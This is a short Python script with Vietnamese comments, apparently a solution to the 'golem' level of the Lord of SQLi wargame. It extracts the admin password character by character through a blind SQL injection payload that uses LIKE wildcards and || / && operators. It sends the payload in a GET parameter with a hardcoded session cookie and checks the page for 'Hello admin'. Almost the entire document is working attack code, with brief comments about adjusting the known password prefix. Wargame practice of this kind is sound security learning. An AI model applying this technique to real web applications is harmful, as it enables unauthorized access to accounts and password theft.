import requests
words='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy' # cái này dùng ascii rồi cộng chuỗi nhá, cho nhanh :D
url='https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
a=""
cookies={
    "PHPSESSID":"s1v411n37ev0ot5ra291moeav0"
    }
for i in words:
 params={"pw":"' || id like'admin' &&pw like '77d6290"+str(i)+"%"}
 r=requests.get(url,params=params,cookies=cookies)
 if "Hello admin" in r.text.split("<strong>")[1].split("code")[0]:
   a+=str(i)
   print(a)
# code tui khá rởm nên các bạn tự thêm bớt chỗ '77d6290' nếu muốn tự làm lại nha
# lúc đầu sài hàm length rồi brute-force thôi V: 
